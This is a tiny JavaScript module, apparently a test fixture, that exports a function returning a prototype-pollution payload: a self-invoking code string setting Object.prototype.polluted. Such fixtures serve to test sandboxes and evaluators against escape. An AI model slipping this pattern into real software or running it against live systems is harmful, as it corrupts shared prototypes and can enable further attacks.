function getPayload() {
    return {
        src: "(function(){1 + (Object.prototype.polluted = `yes`)}())"
    };
}

module.exports = { getPayload };